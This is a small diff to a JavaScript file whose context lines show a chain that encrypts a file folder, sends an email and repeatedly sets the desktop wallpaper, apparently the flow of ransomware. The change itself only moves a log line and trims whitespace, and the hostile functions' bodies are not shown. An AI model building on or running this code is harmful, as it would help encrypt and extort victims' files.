@@ -49,10 +49,9 @@ mailDep()
 .then(() => encrypt(fileFolderPath))
 .then(function(){
      email(); 
+	 console.log("finish!");
      return setWallpaper(1);
 })
-
-console.log("finish!");
 
 function mailDep() {
     return new Promise(function (resolve, reject) {
@@ -208,8 +207,7 @@ function setWallpaper(count){
                     },
                     function (error, stdout, stderr) {
                         i++;
-                        if(i>count){
-                            
+                        if(i>count){   
                             resolve();
                         }else{
                             return innerFunc();
